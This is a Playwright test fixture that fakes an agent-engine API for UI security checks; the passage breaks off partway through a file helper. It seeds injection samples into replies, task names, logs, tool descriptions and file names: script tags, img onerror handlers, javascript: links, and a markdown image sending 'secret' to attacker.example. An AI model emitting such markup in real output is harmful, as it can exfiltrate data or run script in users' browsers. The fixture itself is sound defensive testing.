import {
    AgentId,
    BrowserHelpRequestId,
    BrowserTabId,
    ChatId,
    FileId,
    IntegrationId,
    WalletRecordId,
    WalletRequestId,
    RevisionId,
    RunId,
    TaskId,
    TriggerId,
    createProblem,
    encodeSseMessage,
    ENGINE_API_PREFIX,
    KNOWN_CAPABILITIES,
    LIVE_CHANNEL_PATH,
    LiveSessionId,
    MemberId,
    MessageId,
} from '@ptbk/engine-api';
import type {
    ActivityItem,
    CapabilityRef,
    EngineApiClient,
    EngineApiResponse,
    EngineApiStreamItem,
    ReplyStreamEvent,
    TestChatBody,
    TestChatEvent,
} from '@ptbk/engine-api';
import { DEFAULT_CAPABILITIES, createInMemoryEngine } from '@ptbk/engine-api/in-memory';
import type {
    InMemoryEngineController,
    InMemoryLiveEngine,
    InMemoryMember,
    InMemorySeed,
} from '@ptbk/engine-api/in-memory';
import { readFileSync } from 'node:fs';

import type { Page, Route, WebSocketRoute } from '@playwright/test';

/** The agent page the CSP checks visit. */
export const FAKE_AGENT_ID = 'ada';
/** The owner's chat with Ada, whose reply carries the hostile samples (spec, Security hardening 5). */
export const FAKE_CHAT_ID = 'chat-hostile';
/** A thread longer than any screen, with two agents taking turns. */
export const FAKE_LONG_CHAT_ID = 'chat-long';

/** Every way the spec and M-04's "Injection demo" agent try to make agent output load, run or navigate. */
export const HOSTILE_REPLY = [
    'Here is what I found.',
    '',
    '![x](https://attacker.example/?d=secret)',
    '',
    '<script>alert(1)</script> and <img src=x onerror=alert(1)>',
    '',
    '[click](javascript:alert(1)), [x](data:text/html,<script>alert(1)</script>), [api](/v1/agents/1) and [docs](https://example.com/a)',
    '',
    '```ts',
    'const answer: number = 42; // the answer',
    '```',
    '',
    'overlong'.repeat(80),
].join('\n');

type Call = (
    engineApi: EngineApiClient,
    match: RegExpExecArray,
    query: URLSearchParams,
    body: unknown,
    signal: AbortSignal,
) => Promise<EngineApiResponse<unknown>>;

const agentId = (match: RegExpExecArray) => AgentId.parse(match[1] ?? '');
const chatId = (match: RegExpExecArray) => ChatId.parse(decodeURIComponent(match[1] ?? ''));
const messageId = (match: RegExpExecArray) => MessageId.parse(decodeURIComponent(match[2] ?? ''));
const runId = (match: RegExpExecArray) => RunId.parse(match[1] ?? '');
const taskId = (match: RegExpExecArray) => TaskId.parse(match[1] ?? '');
const triggerId = (match: RegExpExecArray) => TriggerId.parse(match[1] ?? '');
const fileId = (match: RegExpExecArray) => FileId.parse(match[1] ?? '');
const integrationId = (match: RegExpExecArray) => IntegrationId.parse(match[1] ?? '');
const revisionId = (match: RegExpExecArray) => RevisionId.parse(match[2] ?? '');

const tabId = (match: RegExpExecArray) => BrowserTabId.parse(match[1] ?? '');
const liveSessionId = (match: RegExpExecArray) => LiveSessionId.parse(match[1] ?? '');
const helpRequestId = (match: RegExpExecArray) => BrowserHelpRequestId.parse(match[1] ?? '');

/** `browser-tab@1`; an engine that does not advertise it answers each with 404, as a real one does. */
const BROWSER_ROUTES: readonly (readonly ['GET' | 'POST', RegExp, number, Call])[] = [
    [
        'GET',
        /^\/browser-tabs$/,
        200,
        (api, _, query, __, signal) => api.browser.listTabs(Object.fromEntries(query), signal),
    ],
    [
        'POST',
        /^\/browser-tabs\/([\w-]+)\/watch$/,
        201,
        (api, match, _, __, signal) => api.browser.watch(tabId(match), signal),
    ],
    [
        'POST',
        /^\/browser-tabs\/([\w-]+)\/control$/,
        201,
        (api, match, _, __, signal) => api.browser.control(tabId(match), signal),
    ],
    ['POST', /^\/browser-sessions$/, 201, (api, _, __, body, signal) => api.browser.openSignIn(body as never, signal)],
    [
        'GET',
        /^\/browser-sessions\/([\w-]+)$/,
        200,
        (api, match, _, __, signal) => api.browser.getSession(liveSessionId(match), signal),
    ],
    [
        'POST',
        /^\/browser-sessions\/([\w-]+)\/control$/,
        200,
        (api, match, _, __, signal) => api.browser.takeControl(liveSessionId(match), signal),
    ],
    [
        'POST',
        /^\/browser-sessions\/([\w-]+)\/hand-back$/,
        200,
        (api, match, _, __, signal) => api.browser.handBack(liveSessionId(match), signal),
    ],
    [
        'POST',
        /^\/browser-sessions\/([\w-]+)\/end$/,
        200,
        (api, match, _, __, signal) => api.browser.end(liveSessionId(match), signal),
    ],
    [
        'GET',
        /^\/browser-help-requests$/,
        200,
        (api, _, query, __, signal) => api.browser.listHelpRequests(Object.fromEntries(query), signal),
    ],
    [
        'GET',
        /^\/browser-help-requests\/([\w-]+)$/,
        200,
        (api, match, _, __, signal) => api.browser.getHelpRequest(helpRequestId(match), signal),
    ],
    [
        'POST',
        /^\/browser-help-requests\/([\w-]+)\/dismiss$/,
        200,
        (api, match, _, __, signal) => api.browser.dismissHelpRequest(helpRequestId(match), signal),
    ],
];

/** The routes the visited pages call, with the success status the contract gives each; anything else answers 404. */
const ROUTES: readonly (readonly ['GET' | 'POST' | 'PUT', RegExp, number, Call])[] = [
    ['GET', /^\/engine$/, 200, (api, _, __, ___, signal) => api.engine.get(signal)],
    ['GET', /^\/me$/, 200, (api, _, __, ___, signal) => api.me.get(signal)],
    ['GET', /^\/onboarding$/, 200, (api, _, __, ___, signal) => api.onboarding.get(signal)],
    ['POST', /^\/onboarding\/answer$/, 200, (api, _, __, body, signal) => api.onboarding.answer(body as never, signal)],
    ['POST', /^\/onboarding\/defer$/, 200, (api, _, __, ___, signal) => api.onboarding.defer(signal)],
    ['GET', /^\/agents$/, 200, (api, _, query, __, signal) => api.agents.list(Object.fromEntries(query), signal)],
    ['GET', /^\/folders$/, 200, (api, _, query, __, signal) => api.folders.list(Object.fromEntries(query), signal)],
    ['POST', /^\/agents$/, 201, (api, _, __, body, signal) => api.agents.create(body as { source: string }, signal)],
    [
        'POST',
        /^\/agents\/validate$/,
        200,
        (api, _, __, body, signal) => api.agents.validate(body as { source: string }, signal),
    ],
    [
        'GET',
        /^\/agents\/([\w-]+)\/source$/,
        200,
        (api, match, _, __, signal) => api.agents.getSource(agentId(match), signal),
    ],
    [
        'PUT',
        /^\/agents\/([\w-]+)\/source$/,
        200,
        (api, match, _, body, signal) => api.agents.updateSource(agentId(match), body as never, signal),
    ],
    [
        'GET',
        /^\/agents\/([\w-]+)\/revisions$/,
        200,
        (api, match, query, _, signal) => api.agents.listRevisions(agentId(match), Object.fromEntries(query), signal),
    ],
    [
        'GET',
        /^\/agents\/([\w-]+)\/revisions\/([\w-]+)$/,
        200,
        (api, match, _, __, signal) => api.agents.getRevision(agentId(match), revisionId(match), signal),
    ],
    ['GET', /^\/agents\/([\w-]+)$/, 200, (api, match, _, __, signal) => api.agents.get(agentId(match), signal)],
    [
        'GET',
        /^\/agents\/([\w-]+)\/status$/,
        200,
        (api, match, _, __, signal) => api.agents.getStatus(agentId(match), signal),
    ],
    [
        'GET',
        /^\/agents\/([\w-]+)\/chats$/,
        200,
        (api, match, query, _, signal) => api.chats.list(agentId(match), Object.fromEntries(query), signal),
    ],
    ['POST', /^\/chats$/, 201, (api, _, __, body, signal) => api.chats.create(body as { title?: string }, signal)],
    ['GET', /^\/chats\/([^/]+)$/, 200, (api, match, _, __, signal) => api.chats.get(chatId(match), signal)],
    [
        'GET',
        /^\/chats\/([^/]+)\/entries$/,
        200,
        (api, match, query, _, signal) => api.chats.listEntries(chatId(match), Object.fromEntries(query), signal),
    ],
    [
        'POST',
        /^\/chats\/([^/]+)\/messages$/,
        202,
        (api, match, _, body, signal) => api.chats.sendMessage(chatId(match), body as { content: string }, signal),
    ],
    ['POST', /^\/chats\/([^/]+)\/read$/, 200, (api, match, _, __, signal) => api.chats.markRead(chatId(match), signal)],
    [
        'POST',
        /^\/chats\/([^/]+)\/seen$/,
        200,
        (api, match, _, body, signal) => api.chats.markSeen(chatId(match), body as { messageIds: MessageId[] }, signal),
    ],
    [
        'POST',
        /^\/chats\/([^/]+)\/messages\/([^/]+)\/cancel$/,
        200,
        (api, match, _, __, signal) => api.chats.cancelReply(chatId(match), messageId(match), signal),
    ],
    [
        'GET',
        /^\/members\/([\w-]+)$/,
        200,
        (api, [, id = ''], _, __, signal) => api.members.get(MemberId.parse(id), signal),
    ],
    ['GET', /^\/activity$/, 200, (api, _, query, __, signal) => activityPage(api, query, signal)],
    ['GET', /^\/chats$/, 200, (api, _, query, __, signal) => api.chats.listAll(Object.fromEntries(query), signal)],
    ['GET', /^\/security$/, 200, (api, _, __, ___, signal) => api.security.get(signal)],
    ['GET', /^\/members$/, 200, (api, _, query, __, signal) => api.members.list(Object.fromEntries(query), signal)],
    [
        'GET',
        /^\/access-requests$/,
        200,
        (api, _, query, __, signal) => api.members.listAccessRequests(Object.fromEntries(query), signal),
    ],
    ['GET', /^\/settings$/, 200, (api, _, __, ___, signal) => api.settings.get(signal)],
    [
        'GET',
        /^\/invites$/,
        200,
        (api, _, query, __, signal) => api.members.listInvites(Object.fromEntries(query), signal),
    ],
    ...BROWSER_ROUTES,
    ['GET', /^\/wallet$/, 200, (api, _, __, ___, signal) => api.wallet.get(signal)],
    ['POST', /^\/wallet\/records$/, 200, (api, _, __, body, signal) => api.wallet.add(body as never, signal)],
    [
        'PUT',
        /^\/wallet\/records\/([^/]+)$/,
        200,
        (api, match, _, body, signal) => api.wallet.update(WalletRecordId.parse(match[1] ?? ''), body as never, signal),
    ],
    [
        'POST',
        /^\/wallet\/requests\/([^/]+)\/seen$/,
        200,
        (api, match, _, body, signal) =>
            api.wallet.markSeen(WalletRequestId.parse(match[1] ?? ''), body as never, signal),
    ],
    [
        'GET',
        /^\/me\/passkeys$/,
        200,
        (api, _, query, __, signal) => api.me.listPasskeys(Object.fromEntries(query), signal),
    ],
    [
        'GET',
        /^\/me\/sessions$/,
        200,
        (api, _, query, __, signal) => api.me.listSessions(Object.fromEntries(query), signal),
    ],
    ['GET', /^\/passkeys$/, 200, (api, _, query, __, signal) => api.passkeys.list(Object.fromEntries(query), signal)],
    ['GET', /^\/runs$/, 200, (api, _, query, __, signal) => api.runs.list(Object.fromEntries(query), signal)],
    ['GET', /^\/runs\/stats$/, 200, (api, _, query, __, signal) => api.runs.stats(Object.fromEntries(query), signal)],
    ['GET', /^\/runs\/([\w-]+)$/, 200, (api, match, _, __, signal) => api.runs.get(runId(match), signal)],
    ['POST', /^\/runs\/([\w-]+)\/cancel$/, 202, (api, match, _, __, signal) => api.runs.cancel(runId(match), signal)],
    ['POST', /^\/runs\/([\w-]+)\/retry$/, 201, (api, match, _, __, signal) => api.runs.retry(runId(match), signal)],
    ['GET', /^\/tasks$/, 200, (api, _, query, __, signal) => api.tasks.list(Object.fromEntries(query), signal)],
    ['GET', /^\/tasks\/([\w-]+)$/, 200, (api, match, _, __, signal) => api.tasks.get(taskId(match), signal)],
    [
        'GET',
        /^\/tasks\/([\w-]+)\/occurrences$/,
        200,
        (api, match, query, _, signal) => api.tasks.listOccurrences(taskId(match), Object.fromEntries(query), signal),
    ],
    ['GET', /^\/triggers$/, 200, (api, _, query, __, signal) => api.triggers.list(Object.fromEntries(query), signal)],
    [
        'GET',
        /^\/triggers\/stats$/,
        200,
        (api, _, query, __, signal) => api.triggers.stats(Object.fromEntries(query), signal),
    ],
    ['GET', /^\/triggers\/([\w-]+)$/, 200, (api, match, _, __, signal) => api.triggers.get(triggerId(match), signal)],
    [
        'GET',
        /^\/triggers\/([\w-]+)\/fires$/,
        200,
        (api, match, query, _, signal) => api.triggers.listFires(triggerId(match), Object.fromEntries(query), signal),
    ],
    [
        'POST',
        /^\/triggers\/([\w-]+)\/pause$/,
        200,
        (api, match, _, __, signal) => api.triggers.pause(triggerId(match), signal),
    ],
    [
        'POST',
        /^\/triggers\/([\w-]+)\/resume$/,
        200,
        (api, match, _, __, signal) => api.triggers.resume(triggerId(match), signal),
    ],
    ['GET', /^\/files$/, 200, (api, _, query, __, signal) => api.files.list(Object.fromEntries(query), signal)],
    ['GET', /^\/files\/stats$/, 200, (api, _, query, __, signal) => api.files.stats(Object.fromEntries(query), signal)],
    [
        'GET',
        /^\/files\/upload-policy$/,
        200,
        (api, _, query, __, signal) => api.files.uploadPolicy({ purpose: query.get('purpose') as never }, signal),
    ],
    ['GET', /^\/files\/([\w-]+)$/, 200, (api, match, _, __, signal) => api.files.get(fileId(match), signal)],
    [
        'GET',
        /^\/files\/([\w-]+)\/versions$/,
        200,
        (api, match, query, _, signal) => api.files.listVersions(fileId(match), Object.fromEntries(query), signal),
    ],
    [
        'GET',
        /^\/integrations$/,
        200,
        (api, _, query, __, signal) => api.integrations.list(Object.fromEntries(query), signal),
    ],
    [
        'GET',
        /^\/integrations\/stats$/,
        200,
        (api, _, query, __, signal) => api.integrations.stats(Object.fromEntries(query), signal),
    ],
    [
        'GET',
        /^\/integrations\/([\w-]+)$/,
        200,
        (api, match, _, __, signal) => api.integrations.get(integrationId(match), signal),
    ],
    ['POST', /^\/integrations$/, 201, (api, _, __, body, signal) => api.integrations.create(body as never, signal)],
    [
        'POST',
        /^\/integrations\/([\w-]+)\/(enable|disable|check)$/,
        200,
        (api, match, _, __, signal) => {
            const id = integrationId(match);
            if (match[2] === 'enable') return api.integrations.enable(id, signal);
            if (match[2] === 'disable') return api.integrations.disable(id, signal);
            return api.integrations.check(id, signal);
        },
    ],
    ['GET', /^\/audit$/, 200, (api, _, query, __, signal) => api.audit.list(Object.fromEntries(query), signal)],
    ['GET', /^\/audit\/verify$/, 200, (api, _, __, ___, signal) => api.audit.verify(signal)],
];

/** An agent name the engine reports for an activity kind this UI does not know: it must stay text on home. */
export const HOSTILE_AGENT_NAME = '<img src=x onerror=alert(1)> <script>alert(1)</script>';

/** Back to the wire shape: the client reads items into `known`, `unknown` and `invalid`, the browser parses them again. */
function wireItem(item: ActivityItem): unknown {
    if (item.kind === 'known') return item.activity;
    return item.kind === 'unknown' ? item.raw : item.base;
}

/**
 * `GET /activity` from the in-memory engine, plus on the unfiltered first page an item of a kind no UI knows, named
 * after an agent whose name is markup, with a payload that must never be shown.
 */
async function activityPage(
    api: EngineApiClient,
    query: URLSearchParams,
    signal: AbortSignal,
): Promise<EngineApiResponse<unknown>> {
    const response = await api.activity.list(Object.fromEntries(query), signal);
    if (response.kind !== 'ok') return response;
    const items = response.data.items.map(wireItem);
    if (!query.has('cursor') && !query.has('kind') && !query.has('agentId')) {
        items.unshift({
            kind: 'deploy.started',
            v: 1,
            id: 'activity-hostile',
            at: '2026-10-01T11:59:00.000Z',
            agentId: FAKE_AGENT_ID,
            agentName: HOSTILE_AGENT_NAME,
            actor: { kind: 'system' },
            environment: HOSTILE_RUN_TEXT,
        });
    }
    return { ...response, data: { items, nextCursor: response.data.nextCursor } };
}

/** What happened lately, oldest first: a run, a member joining, an update. */
const FAKE_ACTIVITY = [
    {
        kind: 'member.joined',
        v: 1,
        id: 'activity-member',
        at: '2026-10-01T09:00:00.000Z',
        agentId: null,
        actor: { kind: 'system' },
        memberId: 'member-jana',
        displayName: 'Jana Nováková',
    },
    {
        kind: 'run.started',
        v: 1,
        id: 'activity-run',
        at: '2026-10-01T11:58:30.000Z',
        agentId: FAKE_AGENT_ID,
        actor: { kind: 'member', memberId: 'member-owner' },
        runId: 'run-hostile',
        source: 'api',
    },
    {
        kind: 'engine.update-available',
        v: 1,
        id: 'activity-update',
        at: '2026-10-01T11:58:45.000Z',
        agentId: null,
        actor: { kind: 'system' },
        version: '9.9.0',
    },
] as const;

/** A running run of Ada whose logs, error-like text and diff carry the hostile samples. */
export const FAKE_RUN_ID = 'run-hostile';
/** Agent output in a run: it must stay text in logs and diffs. */
export const HOSTILE_RUN_TEXT = '<img src=x onerror=alert(1)> <script>alert(1)</script> javascript:alert(1)';

/** A task whose name, explanation, note and occurrence summary carry agent-written hostile text. */
export const FAKE_TASK_ID = 'task-hostile';

function fakeTasks(): NonNullable<InMemorySeed['tasks']> {
    return [
        {
            task: {
                id: FAKE_TASK_ID,
                name: `Review ${HOSTILE_RUN_TEXT}`,
                kind: 'ordinary',
                purpose: 'content',
                core: false,
                agentId: FAKE_AGENT_ID,
                executor: null,
                priority: { rank: 1, text: null },
                state: 'blocked',
                stateReason: HOSTILE_RUN_TEXT,
                next: HOSTILE_RUN_TEXT,
                conditions: [{ kind: 'dependency', met: false, text: HOSTILE_RUN_TEXT }],
                repeat: { text: '7d', intervalSeconds: 604_800 },
                notBefore: null,
                dueAt: '2026-10-10T09:00:00.000Z',
                nextAt: null,
                progress: { completed: 1, total: 2, summary: HOSTILE_RUN_TEXT },
                parent: null,
                dependsOn: [{ taskId: null, name: HOSTILE_RUN_TEXT, state: 'missing' }],
                origin: { kind: 'chat', chatId: FAKE_CHAT_ID, taskId: null, text: HOSTILE_RUN_TEXT },
                doneCount: 1,
                lastDoneAt: '2026-09-30T10:00:00.000Z',
                reopened: false,
                sourcePath: 'tasks/review.book',
                allowedActions: [],
                updatedAt: '2026-09-30T10:00:00.000Z',
            },
            links: [{ direction: 'incoming', target: { type: 'chat', chatId: FAKE_CHAT_ID, name: HOSTILE_RUN_TEXT } }],
            notes: [HOSTILE_RUN_TEXT],
            occurrences: [
                {
                    id: 'occ-hostile-1',
                    taskId: FAKE_TASK_ID,
                    sequence: 1,
                    cycle: 1,
                    reason: 'first',
                    retryOf: null,
                    state: 'completed',
                    scheduledFor: null,
                    startedAt: '2026-09-30T09:00:00.000Z',
                    endedAt: '2026-09-30T10:00:00.000Z',
                    summary: HOSTILE_RUN_TEXT,
                    runIds: [FAKE_RUN_ID],
                },
            ],
        },
        {
            task: {
                id: 'task-long-name',
                name: `${LONG_TASK_NAME} — 2026-09-30 09:00:00`,
                kind: 'ordinary',
                purpose: 'content',
                core: false,
                agentId: 'grace',
                executor: null,
                priority: { rank: 2, text: 'before the weekly sync' },
                state: 'active',
                stateReason: null,
                next: null,
                conditions: [],
                repeat: null,
                notBefore: null,
                dueAt: null,
                nextAt: null,
                progress: null,
                parent: null,
                dependsOn: [],
                origin: {
                    kind: 'chat',
                    chatId: FAKE_CHAT_ID,
                    taskId: null,
                    text: 'Show me everything you can render.',
                },
                doneCount: 0,
                lastDoneAt: null,
                reopened: false,
                sourcePath: 'tasks/pull-requests.book',
                allowedActions: [],
                updatedAt: '2026-09-30T09:30:00.000Z',
            },
            links: [],
            notes: [],
            occurrences: [],
        },
    ];
}

/** A task name as Reborn writes them for real work: one long sentence, no breaks. */
export const LONG_TASK_NAME =
    'Summarise every open pull request across the webgptorg repositories, flag the ones waiting on review for more than three days and post the digest to the team channel';

function fakeRuns() {
    const base = {
        agentId: FAKE_AGENT_ID,
        chatId: null,
        messageId: null,
        triggerId: null,
        retryOf: null,
        createdBy: 'member-owner',
        cancelRequestedAt: null,
        runner: 'claude-code',
        model: 'claude-sonnet-4-5',
        progress: null,
        usage: null,
        error: null,
        preview: null,
        toolCalls: [],
        outputs: { messages: [], files: [], projectChanges: [] },
        report: { touchedProjects: [], externalSources: [] },
    };
    const diff = ['--- a/README.md', '+++ b/README.md', '@@ -1 +1 @@', '-Welcome', `+${HOSTILE_RUN_TEXT}`, ''].join(
        '\n',
    );
    return [
        {
            ...base,
            id: FAKE_RUN_ID,
            source: 'api' as const,
            status: 'running' as const,
            queuedAt: '2026-10-01T11:58:00.000Z',
            startedAt: '2026-10-01T11:58:30.000Z',
            completedAt: null,
            attemptCount: 1,
            preview: 'Summarise the open pull requests and post a very long status update to the team channel',
            progress: {
                title: 'Summarise open pull requests',
                now: 'Reading pull request 7',
                next: 'Write the summary',
                items: [
                    { id: 'p1', text: 'List open pull requests', status: 'completed' as const },
                    { id: 'p2', text: 'Read each one', status: 'pending' as const },
                ],
            },
            toolCalls: [
                {
                    id: 'tool-1',
                    name: 'github.list_pull_requests',
                    state: 'complete' as const,
                    startedAt: '2026-10-01T11:58:40.000Z',
                    durationMs: 1_200,
                    logs: `GET /repos/acme/site/pulls\n${HOSTILE_RUN_TEXT}\n${'x'.repeat(400)}`,
                    logsTruncated: true,
                },
            ],
            outputs: {
                messages: [],
                files: [],
                projectChanges: [
                    {
                        projectName: 'site',
                        commitHash: 'a'.repeat(40),
                        changedFiles: [{ path: 'README.md', insertions: 1, deletions: 1 }],
                        diff,
                        diffTruncated: false,
                    },
                ],
            },
        },
        {
            ...base,
            id: 'run-failed',
            agentId: 'grace',
            source: 'schedule' as const,
            status: 'failed' as const,
            createdBy: null,
            queuedAt: '2026-10-01T10:00:00.000Z',
            startedAt: '2026-10-01T10:00:05.000Z',
            completedAt: '2026-10-01T10:04:00.000Z',
            attemptCount: 1,
            preview: 'Write the weekly report',
            usage: { inputTokens: null, outputTokens: null, durationMs: null, cost: null },
            error: { code: 'tool-timeout', summary: `The calendar did not answer: ${HOSTILE_RUN_TEXT}` },
        },
        {
            ...base,
            id: 'run-done',
            source: 'web' as const,
            status: 'completed' as const,
            queuedAt: '2026-09-30T10:00:00.000Z',
            startedAt: '2026-09-30T10:00:01.000Z',
            completedAt: '2026-09-30T10:01:00.000Z',
            attemptCount: 1,
            preview: 'Show me everything you can render.',
            usage: {
                inputTokens: 1200,
                outputTokens: 800,
                durationMs: 59_000,
                cost: { amount: '0.0042', currency: 'USD' },
            },
        },
    ];
}

/** A schedule of Ada in Prague whose planned message and failed fire carry the hostile samples. */
export const FAKE_TRIGGER_ID = 'trigger-morning';

function fakeTriggers() {
    const base = {
        agentId: FAKE_AGENT_ID,
        lifecycle: 'active' as const,
        endedReason: null,
        lastFiredAt: null,
        nextFireAt: null,
        createdBy: 'member-owner',
        createdAt: '2026-09-20T10:00:00.000Z',
        updatedAt: '2026-09-20T10:00:00.000Z',
    };
    const schedule = {
        startsAt: '2026-09-20T10:00:00.000Z',
        endsAt: null,
        maxRunCount: null,
        runCount: 0,
        message: 'Check the inbox.',
    };
    return [
        {
            trigger: {
                ...base,
                id: FAKE_TRIGGER_ID,
                name: 'Morning report with a long name that has to wrap on a narrow screen',
                kind: 'schedule' as const,
                lastFiredAt: '2026-09-30T06:00:00.000Z',
                nextFireAt: '2026-10-02T06:00:00.000Z',
                createdAt: '2026-09-25T10:00:00.000Z',
                config: {
                    ...schedule,
                    recurrence: { kind: 'cron' as const, expression: '0 8 * * 1-5', timeZone: 'Europe/Prague' },
                    runCount: 2,
                    maxRunCount: 100,
                    message: `Write the morning report. ${HOSTILE_RUN_TEXT}`,
                },
            },
            fires: [
                {
                    id: 'fire-failed',
                    at: '2026-09-29T06:00:00.000Z',
                    outcome: 'failed' as const,
                    runId: null,
                    error: { code: 'agent-unavailable', summary: `Nothing ran: ${HOSTILE_RUN_TEXT}` },
                },
                {
                    id: 'fire-started',
                    at: '2026-09-30T06:00:00.000Z',
                    outcome: 'started' as const,
                    runId: FAKE_RUN_ID,
                    error: null,
                },
            ],
        },
        {
            trigger: {
                ...base,
                id: 'trigger-inbox',
                name: 'Support inbox',
                kind: 'email' as const,
                createdAt: '2026-09-24T10:00:00.000Z',
                config: { address: 'support-inbox-7f3a9c@memoryengine234567abcdefgh.ptbk.io' },
            },
        },
        {
            trigger: {
                ...base,
                id: 'trigger-paused',
                agentId: 'grace',
                name: 'Every quarter hour',
                kind: 'schedule' as const,
                lifecycle: 'paused' as const,
                createdAt: '2026-09-23T10:00:00.000Z',
                config: { ...schedule, recurrence: { kind: 'interval' as const, everySeconds: 900 } },
            },
        },
        {
            trigger: {
                ...base,
                id: 'trigger-failed',
                name: 'Calendar sync',
                kind: 'schedule' as const,
                lifecycle: 'failed' as const,
                createdAt: '2026-09-22T10:00:00.000Z',
                config: { ...schedule, recurrence: { kind: 'interval' as const, everySeconds: 3_600 } },
            },
        },
    ];
}

/** An MCP server whose tool descriptions and status detail carry hostile text from the third party behind it. */
export const FAKE_INTEGRATION_ID = 'int-docs';
export const HOSTILE_TOOL_TEXT = '<img src=x onerror=alert(1)> <script>alert(1)</script> javascript:alert(1)';

function fakeIntegrations() {
    const base = {
        statusDetail: null,
        scopes: [],
        secretRefs: [],
        tools: [],
        lastActivityAt: null,
        createdBy: 'member-owner',
        createdAt: '2026-09-20T10:00:00.000Z',
        updatedAt: '2026-09-30T10:00:00.000Z',
    };
    return [
        {
            ...base,
            id: FAKE_INTEGRATION_ID,
            agentId: null,
            name: 'Documentation search with a rather long name that has to wrap',
            kind: 'mcp-server' as const,
            status: 'connected' as const,
            scopes: ['docs:read', 'docs:search', `x-${'very-long-scope-'.repeat(8)}`],
            secretRefs: [{ name: 'GITHUB_TOKEN', secretId: 'secret-github', state: 'resolved' as const }],
            tools: [
                { name: 'search', description: 'Searches the documentation.' },
                { name: 'fetch_page', description: HOSTILE_TOOL_TEXT },
            ],
            lastActivityAt: '2026-09-30T10:00:00.000Z',
            config: { url: `https://mcp.example.com/${'deep/'.repeat(30)}sse` },
        },
        {
            ...base,
            id: 'int-billing',
            agentId: FAKE_AGENT_ID,
            name: 'Billing repository',
            kind: 'repository' as const,
            status: 'needs-attention' as const,
            statusDetail: 'Secrets not available: DEPLOY_KEY.',
            scopes: ['contents:read'],
            secretRefs: [{ name: 'DEPLOY_KEY', secretId: null, state: 'missing' as const }],
            config: { provider: 'github' as const, repository: 'acme/billing' },
        },
        {
            ...base,
            id: 'int-calendar',
            agentId: FAKE_AGENT_ID,
            name: 'Calendar',
            kind: 'calendar' as const,
            status: 'error' as const,
            statusDetail: `The provider refused the token: ${HOSTILE_TOOL_TEXT}`,
            secretRefs: [{ name: 'ADA_SEARCH_KEY', secretId: 'secret-ada', state: 'revoked' as const }],
            config: { provider: 'google', account: 'ada@example.com' },
        },
    ];
}

/** A target name that must stay text in the audit log. */
export const HOSTILE_TARGET_NAME = '<img src=x onerror=alert(1)>';

/** Enough entries for a second page, newest the hostile one, with long user agents to test wrapping at 360 px. */
function auditEntries() {
    return Array.from({ length: 60 }, (_, index) => {
        const n = index + 1;
        return {
            at: new Date(Date.parse('2026-09-01T00:00:00Z') + n * 3_600_000).toISOString(),
            actor: n % 10 === 0 ? { kind: 'system' as const } : { kind: 'member' as const, memberId: 'member-jana' },
            action: n % 2 === 0 ? ('agent.update' as const) : ('wallet.record.update' as const),
            target:
                n % 2 === 0
                    ? { kind: 'agent' as const, id: FAKE_AGENT_ID, name: n === 60 ? HOSTILE_TARGET_NAME : 'Ada' }
                    : { kind: 'wallet-record' as const, id: 'login-github', name: 'github.com · ad…@example.com' },
            outcome: n % 7 === 0 ? ('denied' as const) : ('success' as const),
            client:
                n % 10 === 0
                    ? null
                    : {
                          ip: '2001:db8:85a3::8a2e:370:7334',
                          userAgent:
                              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                      },
            details: { fields: ['name', 'visibility'], previous: { visibility: 'private' } },
        };
    });
}

/** Every security panel section filled, with a foreign certificate and a heartbeat in its raw, oddly spaced form. */
export const RAW_HEARTBEAT = '{ "v":1,  "seq" : 7,\n"engineId":"memoryengine234567abcdefgh" }';
/** The version the bundle under test was built as, so the panel sees its loader serving the same one. */
const BUILT_VERSION = (
    JSON.parse(readFileSync(new URL('../../package.json', import.meta.url), 'utf8')) as { version: string }
).version;
const SECURITY_OVERVIEW = {
    engine: { version: '1.4.0', releaseLogIndex: 123456, releaseLogEntryUuid: 'c'.repeat(80) },
    update: { status: 'none', policy: 'auto', pinnedVersion: null, availableVersion: null, eligibleAt: null },
    ui: {
        version: BUILT_VERSION,
        bundleSha256: 'ab'.repeat(32),
        releaseLogIndex: 654321,
        releaseLogEntryUuid: 'd'.repeat(64),
        lastUpdateCheck: {
            at: '2026-10-01T11:00:00.000Z',
            outcome: 'up-to-date',
            version: BUILT_VERSION,
            reason: null,
            revocationReason: null,
        },
    },
    tls: {
        certificateSha256: 'ef'.repeat(32),
        notAfter: '2026-12-01T00:00:00.000Z',
        lastCtCheck: {
            at: '2026-10-01T11:00:00.000Z',
            result: 'unexpected-certificate',
            unexpectedCertificates: [
                {
                    sha256: '99'.repeat(32),
                    issuer: 'CN=Some Other CA, O=Elsewhere',
                    notBefore: '2026-09-01T00:00:00.000Z',
                    notAfter: '2026-12-01T00:00:00.000Z',
                },
            ],
        },
    },
    relays: [
        { hostname: 'relay-a.ptbk.io', status: 'connected', since: '2026-10-01T09:00:00.000Z', lastPingRttMs: 38 },
        { hostname: 'relay-b.ptbk.io', status: 'disconnected', since: '2026-10-01T10:00:00.000Z', lastPingRttMs: null },
    ],
    hostnames: [
        {
            hostname: 'memoryengine234567abcdefgh.ptbk.io',
            kind: 'default',
            certificateStatus: 'valid',
            claimRegistered: null,
        },
        { hostname: 'agents.example.com', kind: 'custom', certificateStatus: 'expiring', claimRegistered: true },
    ],
    lastHeartbeat: { sentAt: '2026-10-01T11:59:00.000Z', body: RAW_HEARTBEAT, signature: `ed25519=${'A'.repeat(86)}` },
    clockSkew: null,
    outboundDestinations: ['https://app.ptbk.io', 'wss://relay-a.ptbk.io', 'https://api.openai.com'],
} as const;

const STREAM = /^\/chats\/([^/]+)\/messages\/([^/]+)\/stream$/;
const TEST_CHAT = /^\/agents\/([\w-]+)\/test-chat$/;
const CONTENT = /^\/files\/([\w-]+)\/content$/;

/** The file the drawer checks: a real PNG, previewed from the content route. */
export const FAKE_FILE_ID = 'file-photo';
/** A file name that must stay text in the list, the drawer and the preview's alt text. */
export const HOSTILE_FILE_NAME = '<img src=x onerror=alert(1)>.png';
const PNG_1X1 = Buffer.from(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=',
    'base64',
);

function fakeFile(id: string, name: string, contentType: string, fields: Record<string, unknown> = {}) {
    return {
        metadata: {
            id,
            name,
            contentType,
            sizeBytes: PNG_1X1.byteLength,
            sha256: 'ab'.repeat(32),
            purpose: 'output' as const,
            agentId: FAKE_AGENT_ID,
            chatId: null,
            runId: null,
